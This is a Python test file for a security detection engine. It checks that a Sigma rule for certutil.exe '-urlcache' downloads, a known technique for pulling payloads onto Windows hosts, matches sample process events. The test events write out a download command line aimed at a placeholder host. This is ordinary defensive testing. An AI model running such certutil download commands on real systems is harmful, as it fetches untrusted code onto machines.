"""Detection-engine tests: compiled rules must match the telemetry they target.

These tests close the loop between the compiler and validation: if a rule
compiles but does not match a representative event, *validated* coverage would be
silently wrong.
"""

from __future__ import annotations

from socrepo.detection_engine import match_event, rule_matches
from socrepo.models import SigmaRule
from socrepo.sigma_compiler import compile_rule


def _certutil_rule(rule_id: int = 100200) -> SigmaRule:
    rule = SigmaRule.model_validate(
        {
            "title": "Certutil Download",
            "id": "00000000-0000-0000-0000-000000000001",
            "level": "high",
            "logsource": {"category": "process_creation", "product": "windows"},
            "detection": {
                "selection": {
                    "Image|endswith": "\\certutil.exe",
                    "CommandLine|contains": "-urlcache",
                },
                "condition": "selection",
            },
            "tags": ["attack.t1105"],
        }
    )
    return compile_rule(rule, rule_id)


def _event(image: str, cmd: str) -> dict:
    # Events are flat, keyed by Sigma field names — exactly the shape the
    # atomic telemetry corpus uses and the engine consumes.
    return {"Image": image, "CommandLine": cmd}


def test_matches_positive_event():
    wz = _certutil_rule()
    ev = _event("C:\\Windows\\System32\\certutil.exe",
                "certutil.exe -urlcache -f http://x/y.exe y.exe")
    assert rule_matches(wz, ev) is True


def test_all_fields_must_match_and_semantics():
    """AND semantics: right binary but wrong flag should not match."""
    wz = _certutil_rule()
    ev = _event("C:\\Windows\\System32\\certutil.exe", "certutil.exe -decode a b")
    assert rule_matches(wz, ev) is False


def test_wrong_binary_does_not_match():
    wz = _certutil_rule()
    ev = _event("C:\\Windows\\System32\\cmd.exe", "cmd.exe -urlcache")
    assert rule_matches(wz, ev) is False


def test_match_event_returns_rule_ids():
    a = _certutil_rule(100200)
    b = _certutil_rule(100999)
    ev = _event("C:\\Windows\\System32\\certutil.exe",
                "certutil.exe -urlcache http://x")
    ids = match_event([a, b], ev)
    assert set(ids) == {100200, 100999}


def test_case_insensitive_matching():
    wz = _certutil_rule()
    ev = _event("C:\\WINDOWS\\SYSTEM32\\CERTUTIL.EXE",
                "CERTUTIL.EXE -URLCACHE http://x")
    assert rule_matches(wz, ev) is True
